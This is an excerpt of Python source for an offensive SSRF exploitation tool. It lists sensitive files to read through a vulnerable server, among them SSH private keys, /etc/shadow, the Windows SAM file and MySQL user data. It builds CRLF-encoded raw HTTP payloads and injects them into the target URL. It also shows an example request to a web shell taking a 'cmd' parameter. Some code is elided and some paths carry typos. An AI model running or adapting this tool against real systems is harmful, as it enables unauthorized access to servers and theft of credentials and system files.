...
Version = "@Мартин. SSRF Tool V1.1.2"
Title = '''
************************************************************************************
...
class Main_Class():
    def __init__(self, args):
        ...
        self.Linux_DIR = ["/root/.ssh/authorized_keys", "/root/.ssh/id_rsa", "/root/.ssh/id_ras.keystore",
                          "/root/.ssh/known_hosts", "/etc/passwd", "/etc/shadow", "/etc/my.cnf",
                          "/etc/httpd/conf/httpd.conf",
                          "/root/.bash_history", "/root/.mysql_history", "/proc/mounts", "/porc/config.gz",
                          "/var/lib/mlocate/mlocate.db", "/porc/self/cmdline", "/flag", "/etc/flag",
                          "/var/www/html/flag.php", "/tmp/flag.php"]
        self.Windows_DIR = ["C:\\boot.ini", "C:\\Windows\\System32\\inetsrv\\MetaBase.xml", "C:\\Windows\\repair\\sam",
                            "C:\\Program Files\mysql\\my.ini", "C:\\Program Files\\mysql\\data\\mysql\\user.MYD",
                            "C:\\Windows\\php.ini",
        ...
        self.info = '''
We have detected that you are attempting to have the server send a get request. If the utilization fails, please try modifying the message in the Requestconf file and deleting the parameters in the message line by line. Test:
Example: [(Keep at least two lines)
GET /xinan/public/shell.php? cmd=ls HTTP/1.1
Host: 127.0.0.1:80
]  
                '''
    def run(self):
    ...
    def Server_Type(self):
        ...
        try:
            response = requests.get(self.URL.split('?')[0], headers={'User-Agent': random.choice(self.User_Agents)},
                                    timeout=5)
        except:
    ...
    def Get_Error_Page_Lenght(self, Protocol):
        try:
            result = requests.get(self.URL.replace("*", Protocol + "Martin"), timeout=2,
                                  headers={'User-Agent': random.choice(self.User_Agents)})
        except:
    ...
    def Build_Payload(self):
        Head_PAYLOAD = urllib.parse.quote(self.note).replace("%0A", "%0D%0A")
        Host = re.search(r'^Host:\s*(.*?)$', self.note, re.MULTILINE).group(1)
    ...
    def Send_Payload(self, payload=None):
        if payload:
            ...
            try:
                status = requests.get(self.URL.replace("*", payload),
                                      headers={'User-Agent': random.choice(self.User_Agents)}, timeout=10)
            except:
